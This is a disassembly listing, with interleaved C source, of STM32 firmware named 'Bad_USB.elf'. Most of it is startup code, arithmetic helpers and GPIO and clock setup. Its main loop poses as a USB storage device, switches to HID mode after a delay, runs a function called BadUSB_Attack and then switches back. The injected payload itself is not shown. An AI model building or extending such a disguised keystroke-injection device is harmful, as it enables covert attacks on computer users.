
Bad_USB.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .isr_vector   0000018c  08000000  08000000  00010000  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .text         0000ce24  0800018c  0800018c  0001018c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  2 .rodata       00000184  0800cfb0  0800cfb0  0001cfb0  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  3 .ARM.extab    00000000  0800d134  0800d134  00020240  2**0
                  CONTENTS
  4 .ARM          00000008  0800d134  0800d134  0001d134  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  5 .preinit_array 00000000  0800d13c  0800d13c  00020240  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  6 .init_array   00000004  0800d13c  0800d13c  0001d13c  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  7 .fini_array   00000004  0800d140  0800d140  0001d140  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  8 .data         00000240  20000000  0800d144  00020000  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  9 .bss          00001cd4  20000240  0800d384  00020240  2**2
                  ALLOC
 10 ._user_heap_stack 00001604  20001f14  0800d384  00021f14  2**0
                  ALLOC
 11 .ARM.attributes 00000030  00000000  00000000  00020240  2**0
                  CONTENTS, READONLY
 12 .comment      00000043  00000000  00000000  00020270  2**0
                  CONTENTS, READONLY
 13 .debug_info   00020948  00000000  00000000  000202b3  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 14 .debug_abbrev 00005387  00000000  00000000  00040bfb  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 15 .debug_aranges 00001b30  00000000  00000000  00045f88  2**3
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 16 .debug_rnglists 000014c0  00000000  00000000  00047ab8  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 17 .debug_macro  000265e5  00000000  00000000  00048f78  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 18 .debug_line   00025ab7  00000000  00000000  0006f55d  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 19 .debug_str    000d23c8  00000000  00000000  00095014  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 20 .debug_frame  00006f48  00000000  00000000  001673dc  2**2
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 21 .debug_line_str 00000049  00000000  00000000  0016e324  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS

Disassembly of section .text:

0800018c <__do_global_dtors_aux>:
 800018c:	b510      	push	{r4, lr}
 800018e:	4c05      	ldr	r4, [pc, #20]	; (80001a4 <__do_global_dtors_aux+0x18>)
 8000190:	7823      	ldrb	r3, [r4, #0]
 8000192:	b933      	cbnz	r3, 80001a2 <__do_global_dtors_aux+0x16>
 8000194:	4b04      	ldr	r3, [pc, #16]	; (80001a8 <__do_global_dtors_aux+0x1c>)
 8000196:	b113      	cbz	r3, 800019e <__do_global_dtors_aux+0x12>
 8000198:	4804      	ldr	r0, [pc, #16]	; (80001ac <__do_global_dtors_aux+0x20>)
 800019a:	f3af 8000 	nop.w
 800019e:	2301      	movs	r3, #1
 80001a0:	7023      	strb	r3, [r4, #0]
 80001a2:	bd10      	pop	{r4, pc}
 80001a4:	20000240 	.word	0x20000240
 80001a8:	00000000 	.word	0x00000000
 80001ac:	0800cf98 	.word	0x0800cf98

080001b0 <frame_dummy>:
 80001b0:	b508      	push	{r3, lr}
 80001b2:	4b03      	ldr	r3, [pc, #12]	; (80001c0 <frame_dummy+0x10>)
 80001b4:	b11b      	cbz	r3, 80001be <frame_dummy+0xe>
 80001b6:	4903      	ldr	r1, [pc, #12]	; (80001c4 <frame_dummy+0x14>)
 80001b8:	4803      	ldr	r0, [pc, #12]	; (80001c8 <frame_dummy+0x18>)
 80001ba:	f3af 8000 	nop.w
 80001be:	bd08      	pop	{r3, pc}
 80001c0:	00000000 	.word	0x00000000
 80001c4:	20000244 	.word	0x20000244
 80001c8:	0800cf98 	.word	0x0800cf98

080001cc <strlen>:
 80001cc:	4603      	mov	r3, r0
 80001ce:	f813 2b01 	ldrb.w	r2, [r3], #1
 80001d2:	2a00      	cmp	r2, #0
 80001d4:	d1fb      	bne.n	80001ce <strlen+0x2>
 80001d6:	1a18      	subs	r0, r3, r0
 80001d8:	3801      	subs	r0, #1
 80001da:	4770      	bx	lr

080001dc <__aeabi_uldivmod>:
 80001dc:	b953      	cbnz	r3, 80001f4 <__aeabi_uldivmod+0x18>
 80001de:	b94a      	cbnz	r2, 80001f4 <__aeabi_uldivmod+0x18>
 80001e0:	2900      	cmp	r1, #0
 80001e2:	bf08      	it	eq
 80001e4:	2800      	cmpeq	r0, #0
 80001e6:	bf1c      	itt	ne
 80001e8:	f04f 31ff 	movne.w	r1, #4294967295
 80001ec:	f04f 30ff 	movne.w	r0, #4294967295
 80001f0:	f000 b970 	b.w	80004d4 <__aeabi_idiv0>
 80001f4:	f1ad 0c08 	sub.w	ip, sp, #8
 80001f8:	e96d ce04 	strd	ip, lr, [sp, #-16]!
 80001fc:	f000 f806 	bl	800020c <__udivmoddi4>
 8000200:	f8dd e004 	ldr.w	lr, [sp, #4]
 8000204:	e9dd 2302 	ldrd	r2, r3, [sp, #8]
 8000208:	b004      	add	sp, #16
 800020a:	4770      	bx	lr

0800020c <__udivmoddi4>:
 800020c:	e92d 47f0 	stmdb	sp!, {r4, r5, r6, r7, r8, r9, sl, lr}
 8000210:	9e08      	ldr	r6, [sp, #32]
 8000212:	460d      	mov	r5, r1
 8000214:	4604      	mov	r4, r0
 8000216:	460f      	mov	r7, r1
 8000218:	2b00      	cmp	r3, #0
 800021a:	d14a      	bne.n	80002b2 <__udivmoddi4+0xa6>
 800021c:	428a      	cmp	r2, r1
 800021e:	4694      	mov	ip, r2
 8000220:	d965      	bls.n	80002ee <__udivmoddi4+0xe2>
 8000222:	fab2 f382 	clz	r3, r2
 8000226:	b143      	cbz	r3, 800023a <__udivmoddi4+0x2e>
 8000228:	fa02 fc03 	lsl.w	ip, r2, r3
 800022c:	f1c3 0220 	rsb	r2, r3, #32
 8000230:	409f      	lsls	r7, r3
 8000232:	fa20 f202 	lsr.w	r2, r0, r2
 8000236:	4317      	orrs	r7, r2
 8000238:	409c      	lsls	r4, r3
 800023a:	ea4f 4e1c 	mov.w	lr, ip, lsr #16
 800023e:	fa1f f58c 	uxth.w	r5, ip
 8000242:	fbb7 f1fe 	udiv	r1, r7, lr
 8000246:	0c22      	lsrs	r2, r4, #16
 8000248:	fb0e 7711 	mls	r7, lr, r1, r7
 800024c:	ea42 4207 	orr.w	r2, r2, r7, lsl #16
 8000250:	fb01 f005 	mul.w	r0, r1, r5
 8000254:	4290      	cmp	r0, r2
 8000256:	d90a      	bls.n	800026e <__udivmoddi4+0x62>
 8000258:	eb1c 0202 	adds.w	r2, ip, r2
 800025c:	f101 37ff 	add.w	r7, r1, #4294967295
 8000260:	f080 811c 	bcs.w	800049c <__udivmoddi4+0x290>
 8000264:	4290      	cmp	r0, r2
 8000266:	f240 8119 	bls.w	800049c <__udivmoddi4+0x290>
 800026a:	3902      	subs	r1, #2
 800026c:	4462      	add	r2, ip
 800026e:	1a12      	subs	r2, r2, r0
 8000270:	b2a4      	uxth	r4, r4
 8000272:	fbb2 f0fe 	udiv	r0, r2, lr
 8000276:	fb0e 2210 	mls	r2, lr, r0, r2
 800027a:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 800027e:	fb00 f505 	mul.w	r5, r0, r5
 8000282:	42a5      	cmp	r5, r4
 8000284:	d90a      	bls.n	800029c <__udivmoddi4+0x90>
 8000286:	eb1c 0404 	adds.w	r4, ip, r4
 800028a:	f100 32ff 	add.w	r2, r0, #4294967295
 800028e:	f080 8107 	bcs.w	80004a0 <__udivmoddi4+0x294>
 8000292:	42a5      	cmp	r5, r4
 8000294:	f240 8104 	bls.w	80004a0 <__udivmoddi4+0x294>
 8000298:	4464      	add	r4, ip
 800029a:	3802      	subs	r0, #2
 800029c:	ea40 4001 	orr.w	r0, r0, r1, lsl #16
 80002a0:	1b64      	subs	r4, r4, r5
 80002a2:	2100      	movs	r1, #0
 80002a4:	b11e      	cbz	r6, 80002ae <__udivmoddi4+0xa2>
 80002a6:	40dc      	lsrs	r4, r3
 80002a8:	2300      	movs	r3, #0
 80002aa:	e9c6 4300 	strd	r4, r3, [r6]
 80002ae:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002b2:	428b      	cmp	r3, r1
 80002b4:	d908      	bls.n	80002c8 <__udivmoddi4+0xbc>
 80002b6:	2e00      	cmp	r6, #0
 80002b8:	f000 80ed 	beq.w	8000496 <__udivmoddi4+0x28a>
 80002bc:	2100      	movs	r1, #0
 80002be:	e9c6 0500 	strd	r0, r5, [r6]
 80002c2:	4608      	mov	r0, r1
 80002c4:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002c8:	fab3 f183 	clz	r1, r3
 80002cc:	2900      	cmp	r1, #0
 80002ce:	d149      	bne.n	8000364 <__udivmoddi4+0x158>
 80002d0:	42ab      	cmp	r3, r5
 80002d2:	d302      	bcc.n	80002da <__udivmoddi4+0xce>
 80002d4:	4282      	cmp	r2, r0
 80002d6:	f200 80f8 	bhi.w	80004ca <__udivmoddi4+0x2be>
 80002da:	1a84      	subs	r4, r0, r2
 80002dc:	eb65 0203 	sbc.w	r2, r5, r3
 80002e0:	2001      	movs	r0, #1
 80002e2:	4617      	mov	r7, r2
 80002e4:	2e00      	cmp	r6, #0
 80002e6:	d0e2      	beq.n	80002ae <__udivmoddi4+0xa2>
 80002e8:	e9c6 4700 	strd	r4, r7, [r6]
 80002ec:	e7df      	b.n	80002ae <__udivmoddi4+0xa2>
 80002ee:	b902      	cbnz	r2, 80002f2 <__udivmoddi4+0xe6>
 80002f0:	deff      	udf	#255	; 0xff
 80002f2:	fab2 f382 	clz	r3, r2
 80002f6:	2b00      	cmp	r3, #0
 80002f8:	f040 8090 	bne.w	800041c <__udivmoddi4+0x210>
 80002fc:	1a8a      	subs	r2, r1, r2
 80002fe:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000302:	fa1f fe8c 	uxth.w	lr, ip
 8000306:	2101      	movs	r1, #1
 8000308:	fbb2 f5f7 	udiv	r5, r2, r7
 800030c:	fb07 2015 	mls	r0, r7, r5, r2
 8000310:	0c22      	lsrs	r2, r4, #16
 8000312:	ea42 4200 	orr.w	r2, r2, r0, lsl #16
 8000316:	fb0e f005 	mul.w	r0, lr, r5
 800031a:	4290      	cmp	r0, r2
 800031c:	d908      	bls.n	8000330 <__udivmoddi4+0x124>
 800031e:	eb1c 0202 	adds.w	r2, ip, r2
 8000322:	f105 38ff 	add.w	r8, r5, #4294967295
 8000326:	d202      	bcs.n	800032e <__udivmoddi4+0x122>
 8000328:	4290      	cmp	r0, r2
 800032a:	f200 80cb 	bhi.w	80004c4 <__udivmoddi4+0x2b8>
 800032e:	4645      	mov	r5, r8
 8000330:	1a12      	subs	r2, r2, r0
 8000332:	b2a4      	uxth	r4, r4
 8000334:	fbb2 f0f7 	udiv	r0, r2, r7
 8000338:	fb07 2210 	mls	r2, r7, r0, r2
 800033c:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 8000340:	fb0e fe00 	mul.w	lr, lr, r0
 8000344:	45a6      	cmp	lr, r4
 8000346:	d908      	bls.n	800035a <__udivmoddi4+0x14e>
 8000348:	eb1c 0404 	adds.w	r4, ip, r4
 800034c:	f100 32ff 	add.w	r2, r0, #4294967295
 8000350:	d202      	bcs.n	8000358 <__udivmoddi4+0x14c>
 8000352:	45a6      	cmp	lr, r4
 8000354:	f200 80bb 	bhi.w	80004ce <__udivmoddi4+0x2c2>
 8000358:	4610      	mov	r0, r2
 800035a:	eba4 040e 	sub.w	r4, r4, lr
 800035e:	ea40 4005 	orr.w	r0, r0, r5, lsl #16
 8000362:	e79f      	b.n	80002a4 <__udivmoddi4+0x98>
 8000364:	f1c1 0720 	rsb	r7, r1, #32
 8000368:	408b      	lsls	r3, r1
 800036a:	fa22 fc07 	lsr.w	ip, r2, r7
 800036e:	ea4c 0c03 	orr.w	ip, ip, r3
 8000372:	fa05 f401 	lsl.w	r4, r5, r1
 8000376:	fa20 f307 	lsr.w	r3, r0, r7
 800037a:	40fd      	lsrs	r5, r7
 800037c:	ea4f 491c 	mov.w	r9, ip, lsr #16
 8000380:	4323      	orrs	r3, r4
 8000382:	fbb5 f8f9 	udiv	r8, r5, r9
 8000386:	fa1f fe8c 	uxth.w	lr, ip
 800038a:	fb09 5518 	mls	r5, r9, r8, r5
 800038e:	0c1c      	lsrs	r4, r3, #16
 8000390:	ea44 4405 	orr.w	r4, r4, r5, lsl #16
 8000394:	fb08 f50e 	mul.w	r5, r8, lr
 8000398:	42a5      	cmp	r5, r4
 800039a:	fa02 f201 	lsl.w	r2, r2, r1
 800039e:	fa00 f001 	lsl.w	r0, r0, r1
 80003a2:	d90b      	bls.n	80003bc <__udivmoddi4+0x1b0>
 80003a4:	eb1c 0404 	adds.w	r4, ip, r4
 80003a8:	f108 3aff 	add.w	sl, r8, #4294967295
 80003ac:	f080 8088 	bcs.w	80004c0 <__udivmoddi4+0x2b4>
 80003b0:	42a5      	cmp	r5, r4
 80003b2:	f240 8085 	bls.w	80004c0 <__udivmoddi4+0x2b4>
 80003b6:	f1a8 0802 	sub.w	r8, r8, #2
 80003ba:	4464      	add	r4, ip
 80003bc:	1b64      	subs	r4, r4, r5
 80003be:	b29d      	uxth	r5, r3
 80003c0:	fbb4 f3f9 	udiv	r3, r4, r9
 80003c4:	fb09 4413 	mls	r4, r9, r3, r4
 80003c8:	ea45 4404 	orr.w	r4, r5, r4, lsl #16
 80003cc:	fb03 fe0e 	mul.w	lr, r3, lr
 80003d0:	45a6      	cmp	lr, r4
 80003d2:	d908      	bls.n	80003e6 <__udivmoddi4+0x1da>
 80003d4:	eb1c 0404 	adds.w	r4, ip, r4
 80003d8:	f103 35ff 	add.w	r5, r3, #4294967295
 80003dc:	d26c      	bcs.n	80004b8 <__udivmoddi4+0x2ac>
 80003de:	45a6      	cmp	lr, r4
 80003e0:	d96a      	bls.n	80004b8 <__udivmoddi4+0x2ac>
 80003e2:	3b02      	subs	r3, #2
 80003e4:	4464      	add	r4, ip
 80003e6:	ea43 4308 	orr.w	r3, r3, r8, lsl #16
 80003ea:	fba3 9502 	umull	r9, r5, r3, r2
 80003ee:	eba4 040e 	sub.w	r4, r4, lr
 80003f2:	42ac      	cmp	r4, r5
 80003f4:	46c8      	mov	r8, r9
 80003f6:	46ae      	mov	lr, r5
 80003f8:	d356      	bcc.n	80004a8 <__udivmoddi4+0x29c>
 80003fa:	d053      	beq.n	80004a4 <__udivmoddi4+0x298>
 80003fc:	b156      	cbz	r6, 8000414 <__udivmoddi4+0x208>
 80003fe:	ebb0 0208 	subs.w	r2, r0, r8
 8000402:	eb64 040e 	sbc.w	r4, r4, lr
 8000406:	fa04 f707 	lsl.w	r7, r4, r7
 800040a:	40ca      	lsrs	r2, r1
 800040c:	40cc      	lsrs	r4, r1
 800040e:	4317      	orrs	r7, r2
 8000410:	e9c6 7400 	strd	r7, r4, [r6]
 8000414:	4618      	mov	r0, r3
 8000416:	2100      	movs	r1, #0
 8000418:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 800041c:	f1c3 0120 	rsb	r1, r3, #32
 8000420:	fa02 fc03 	lsl.w	ip, r2, r3
 8000424:	fa20 f201 	lsr.w	r2, r0, r1
 8000428:	fa25 f101 	lsr.w	r1, r5, r1
 800042c:	409d      	lsls	r5, r3
 800042e:	432a      	orrs	r2, r5
 8000430:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000434:	fa1f fe8c 	uxth.w	lr, ip
 8000438:	fbb1 f0f7 	udiv	r0, r1, r7
 800043c:	fb07 1510 	mls	r5, r7, r0, r1
 8000440:	0c11      	lsrs	r1, r2, #16
 8000442:	ea41 4105 	orr.w	r1, r1, r5, lsl #16
 8000446:	fb00 f50e 	mul.w	r5, r0, lr
 800044a:	428d      	cmp	r5, r1
 800044c:	fa04 f403 	lsl.w	r4, r4, r3
 8000450:	d908      	bls.n	8000464 <__udivmoddi4+0x258>
 8000452:	eb1c 0101 	adds.w	r1, ip, r1
 8000456:	f100 38ff 	add.w	r8, r0, #4294967295
 800045a:	d22f      	bcs.n	80004bc <__udivmoddi4+0x2b0>
 800045c:	428d      	cmp	r5, r1
 800045e:	d92d      	bls.n	80004bc <__udivmoddi4+0x2b0>
 8000460:	3802      	subs	r0, #2
 8000462:	4461      	add	r1, ip
 8000464:	1b49      	subs	r1, r1, r5
 8000466:	b292      	uxth	r2, r2
 8000468:	fbb1 f5f7 	udiv	r5, r1, r7
 800046c:	fb07 1115 	mls	r1, r7, r5, r1
 8000470:	ea42 4201 	orr.w	r2, r2, r1, lsl #16
 8000474:	fb05 f10e 	mul.w	r1, r5, lr
 8000478:	4291      	cmp	r1, r2
 800047a:	d908      	bls.n	800048e <__udivmoddi4+0x282>
 800047c:	eb1c 0202 	adds.w	r2, ip, r2
 8000480:	f105 38ff 	add.w	r8, r5, #4294967295
 8000484:	d216      	bcs.n	80004b4 <__udivmoddi4+0x2a8>
 8000486:	4291      	cmp	r1, r2
 8000488:	d914      	bls.n	80004b4 <__udivmoddi4+0x2a8>
 800048a:	3d02      	subs	r5, #2
 800048c:	4462      	add	r2, ip
 800048e:	1a52      	subs	r2, r2, r1
 8000490:	ea45 4100 	orr.w	r1, r5, r0, lsl #16
 8000494:	e738      	b.n	8000308 <__udivmoddi4+0xfc>
 8000496:	4631      	mov	r1, r6
 8000498:	4630      	mov	r0, r6
 800049a:	e708      	b.n	80002ae <__udivmoddi4+0xa2>
 800049c:	4639      	mov	r1, r7
 800049e:	e6e6      	b.n	800026e <__udivmoddi4+0x62>
 80004a0:	4610      	mov	r0, r2
 80004a2:	e6fb      	b.n	800029c <__udivmoddi4+0x90>
 80004a4:	4548      	cmp	r0, r9
 80004a6:	d2a9      	bcs.n	80003fc <__udivmoddi4+0x1f0>
 80004a8:	ebb9 0802 	subs.w	r8, r9, r2
 80004ac:	eb65 0e0c 	sbc.w	lr, r5, ip
 80004b0:	3b01      	subs	r3, #1
 80004b2:	e7a3      	b.n	80003fc <__udivmoddi4+0x1f0>
 80004b4:	4645      	mov	r5, r8
 80004b6:	e7ea      	b.n	800048e <__udivmoddi4+0x282>
 80004b8:	462b      	mov	r3, r5
 80004ba:	e794      	b.n	80003e6 <__udivmoddi4+0x1da>
 80004bc:	4640      	mov	r0, r8
 80004be:	e7d1      	b.n	8000464 <__udivmoddi4+0x258>
 80004c0:	46d0      	mov	r8, sl
 80004c2:	e77b      	b.n	80003bc <__udivmoddi4+0x1b0>
 80004c4:	3d02      	subs	r5, #2
 80004c6:	4462      	add	r2, ip
 80004c8:	e732      	b.n	8000330 <__udivmoddi4+0x124>
 80004ca:	4608      	mov	r0, r1
 80004cc:	e70a      	b.n	80002e4 <__udivmoddi4+0xd8>
 80004ce:	4464      	add	r4, ip
 80004d0:	3802      	subs	r0, #2
 80004d2:	e742      	b.n	800035a <__udivmoddi4+0x14e>

080004d4 <__aeabi_idiv0>:
 80004d4:	4770      	bx	lr
 80004d6:	bf00      	nop

080004d8 <MX_GPIO_Init>:
        * Output
        * EVENT_OUT
        * EXTI
*/
void MX_GPIO_Init(void)
{
 80004d8:	b580      	push	{r7, lr}
 80004da:	b088      	sub	sp, #32
 80004dc:	af00      	add	r7, sp, #0

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 80004de:	f107 030c 	add.w	r3, r7, #12
 80004e2:	2200      	movs	r2, #0
 80004e4:	601a      	str	r2, [r3, #0]
 80004e6:	605a      	str	r2, [r3, #4]
 80004e8:	609a      	str	r2, [r3, #8]
 80004ea:	60da      	str	r2, [r3, #12]
 80004ec:	611a      	str	r2, [r3, #16]

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOC_CLK_ENABLE();
 80004ee:	4b24      	ldr	r3, [pc, #144]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f0:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004f2:	4a23      	ldr	r2, [pc, #140]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f4:	f043 0304 	orr.w	r3, r3, #4
 80004f8:	64d3      	str	r3, [r2, #76]	; 0x4c
 80004fa:	4b21      	ldr	r3, [pc, #132]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004fc:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004fe:	f003 0304 	and.w	r3, r3, #4
 8000502:	60bb      	str	r3, [r7, #8]
 8000504:	68bb      	ldr	r3, [r7, #8]
  __HAL_RCC_GPIOA_CLK_ENABLE();
 8000506:	4b1e      	ldr	r3, [pc, #120]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000508:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800050a:	4a1d      	ldr	r2, [pc, #116]	; (8000580 <MX_GPIO_Init+0xa8>)
 800050c:	f043 0301 	orr.w	r3, r3, #1
 8000510:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000512:	4b1b      	ldr	r3, [pc, #108]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000514:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000516:	f003 0301 	and.w	r3, r3, #1
 800051a:	607b      	str	r3, [r7, #4]
 800051c:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_GPIOB_CLK_ENABLE();
 800051e:	4b18      	ldr	r3, [pc, #96]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000520:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000522:	4a17      	ldr	r2, [pc, #92]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000524:	f043 0302 	orr.w	r3, r3, #2
 8000528:	64d3      	str	r3, [r2, #76]	; 0x4c
 800052a:	4b15      	ldr	r3, [pc, #84]	; (8000580 <MX_GPIO_Init+0xa8>)
 800052c:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800052e:	f003 0302 	and.w	r3, r3, #2
 8000532:	603b      	str	r3, [r7, #0]
 8000534:	683b      	ldr	r3, [r7, #0]

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOB, SPI1_CS_Pin|LD3_Pin, GPIO_PIN_SET);
 8000536:	2201      	movs	r2, #1
 8000538:	2109      	movs	r1, #9
 800053a:	4812      	ldr	r0, [pc, #72]	; (8000584 <MX_GPIO_Init+0xac>)
 800053c:	f001 fb00 	bl	8001b40 <HAL_GPIO_WritePin>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = SPI1_CS_Pin;
 8000540:	2301      	movs	r3, #1
 8000542:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000544:	2301      	movs	r3, #1
 8000546:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_PULLUP;
 8000548:	2301      	movs	r3, #1
 800054a:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 800054c:	2300      	movs	r3, #0
 800054e:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(SPI1_CS_GPIO_Port, &GPIO_InitStruct);
 8000550:	f107 030c 	add.w	r3, r7, #12
 8000554:	4619      	mov	r1, r3
 8000556:	480b      	ldr	r0, [pc, #44]	; (8000584 <MX_GPIO_Init+0xac>)
 8000558:	f001 f988 	bl	800186c <HAL_GPIO_Init>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = LD3_Pin;
 800055c:	2308      	movs	r3, #8
 800055e:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000560:	2301      	movs	r3, #1
 8000562:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000564:	2300      	movs	r3, #0
 8000566:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 8000568:	2300      	movs	r3, #0
 800056a:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(LD3_GPIO_Port, &GPIO_InitStruct);
 800056c:	f107 030c 	add.w	r3, r7, #12
 8000570:	4619      	mov	r1, r3
 8000572:	4804      	ldr	r0, [pc, #16]	; (8000584 <MX_GPIO_Init+0xac>)
 8000574:	f001 f97a 	bl	800186c <HAL_GPIO_Init>

}
 8000578:	bf00      	nop
 800057a:	3720      	adds	r7, #32
 800057c:	46bd      	mov	sp, r7
 800057e:	bd80      	pop	{r7, pc}
 8000580:	40021000 	.word	0x40021000
 8000584:	48000400 	.word	0x48000400

08000588 <main>:
/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
 8000588:	b580      	push	{r7, lr}
 800058a:	b082      	sub	sp, #8
 800058c:	af00      	add	r7, sp, #0
  /* USER CODE END 1 */

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();
 800058e:	f000 fd4a 	bl	8001026 <HAL_Init>
  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();
 8000592:	f000 f833 	bl	80005fc <SystemClock_Config>
  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
 8000596:	f7ff ff9f 	bl	80004d8 <MX_GPIO_Init>
  MX_USART2_UART_Init();
 800059a:	f000 fc81 	bl	8000ea0 <MX_USART2_UART_Init>
  MX_SPI1_Init();
 800059e:	f000 fb19 	bl	8000bd4 <MX_SPI1_Init>
  /* USER CODE BEGIN 2 */
  int flag = 0;
 80005a2:	2300      	movs	r3, #0
 80005a4:	607b      	str	r3, [r7, #4]
  isMSC = 1;
 80005a6:	4b12      	ldr	r3, [pc, #72]	; (80005f0 <main+0x68>)
 80005a8:	2201      	movs	r2, #1
 80005aa:	601a      	str	r2, [r3, #0]
  MX_USB_DEVICE_Init_MSC();
 80005ac:	f00b feb2 	bl	800c314 <MX_USB_DEVICE_Init_MSC>

  memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80005b0:	220f      	movs	r2, #15
 80005b2:	2100      	movs	r1, #0
 80005b4:	480f      	ldr	r0, [pc, #60]	; (80005f4 <main+0x6c>)
 80005b6:	f00c fcb5 	bl	800cf24 <memset>

  flag = 1;
 80005ba:	2301      	movs	r3, #1
 80005bc:	607b      	str	r3, [r7, #4]
  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while(1){
	  InterruptTrap(&InterruptFlag);
 80005be:	480e      	ldr	r0, [pc, #56]	; (80005f8 <main+0x70>)
 80005c0:	f000 fa34 	bl	8000a2c <InterruptTrap>

	  if(flag == 1){
 80005c4:	687b      	ldr	r3, [r7, #4]
 80005c6:	2b01      	cmp	r3, #1
 80005c8:	d1f9      	bne.n	80005be <main+0x36>
		  HAL_Delay(10000); //random slot to switch HID
 80005ca:	f242 7010 	movw	r0, #10000	; 0x2710
 80005ce:	f000 fd9f 	bl	8001110 <HAL_Delay>
		  SwitchToHID();
 80005d2:	f000 f88b 	bl	80006ec <SwitchToHID>
		  HAL_Delay(10000); //test Device Manager
 80005d6:	f242 7010 	movw	r0, #10000	; 0x2710
 80005da:	f000 fd99 	bl	8001110 <HAL_Delay>
		  //Attack begin
		  BadUSB_Attack(0);
 80005de:	2000      	movs	r0, #0
 80005e0:	f000 fa42 	bl	8000a68 <BadUSB_Attack>

		  flag = 0;
 80005e4:	2300      	movs	r3, #0
 80005e6:	607b      	str	r3, [r7, #4]
		  SwitchToMSC();
 80005e8:	f000 f898 	bl	800071c <SwitchToMSC>
	  InterruptTrap(&InterruptFlag);
 80005ec:	e7e7      	b.n	80005be <main+0x36>
 80005ee:	bf00      	nop
 80005f0:	20000978 	.word	0x20000978
 80005f4:	2000025c 	.word	0x2000025c
 80005f8:	20000270 	.word	0x20000270

080005fc <SystemClock_Config>:
/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
 80005fc:	b580      	push	{r7, lr}
 80005fe:	b096      	sub	sp, #88	; 0x58
 8000600:	af00      	add	r7, sp, #0
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
 8000602:	f107 0314 	add.w	r3, r7, #20
 8000606:	2244      	movs	r2, #68	; 0x44
 8000608:	2100      	movs	r1, #0
 800060a:	4618      	mov	r0, r3
 800060c:	f00c fc8a 	bl	800cf24 <memset>
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};
 8000610:	463b      	mov	r3, r7
 8000612:	2200      	movs	r2, #0
 8000614:	601a      	str	r2, [r3, #0]
 8000616:	605a      	str	r2, [r3, #4]
 8000618:	609a      	str	r2, [r3, #8]
 800061a:	60da      	str	r2, [r3, #12]
 800061c:	611a      	str	r2, [r3, #16]

  /** Configure the main internal regulator output voltage
  */
  if (HAL_PWREx_ControlVoltageScaling(PWR_REGULATOR_VOLTAGE_SCALE1) != HAL_OK)
 800061e:	f44f 7000 	mov.w	r0, #512	; 0x200
 8000622:	f003 f887 	bl	8003734 <HAL_PWREx_ControlVoltageScaling>
 8000626:	4603      	mov	r3, r0
 8000628:	2b00      	cmp	r3, #0
 800062a:	d001      	beq.n	8000630 <SystemClock_Config+0x34>
  {
    Error_Handler();
 800062c:	f000 facc 	bl	8000bc8 <Error_Handler>
  }

